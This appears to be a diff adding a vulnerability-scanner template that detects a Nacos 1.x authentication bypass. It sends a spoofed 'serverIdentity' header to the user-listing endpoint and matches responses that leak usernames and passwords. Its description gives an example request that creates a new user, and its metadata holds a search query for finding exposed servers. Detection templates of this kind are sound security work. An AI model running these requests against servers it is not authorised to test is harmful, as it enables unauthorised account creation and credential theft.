@@ -1,0 +1,49 @@
+id: nacos-auth-bypass
+
+info:
+  name: Nacos 1.x - Authentication Bypass
+  author: taielab,pikpikcu,SleepingBag945
+  severity: critical
+  description: |
+    Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.
+  reference:
+    - https://github.com/alibaba/nacos/issues/4593
+    - https://nacos.io/en-us/docs/auth.html
+    - https://zhuanlan.zhihu.com/p/602021283
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="NACOS"
+  tags: nacos,auth-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
+      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9"
+
+    headers:
+      serverIdentity: security
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"totalCount":'
+          - '"username":'
+          - '"password":'
+          - '"pagesAvailable":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a0047304502202b019d11f851ba086249eb599d33d954df8b7d187cd300f88ab2639133156576022100c194e804a32b976dafd47deb537e3152e22a552fdda4628fcdf29fa49fbfa67f:922c64590222798bb761d5b6d8e72950
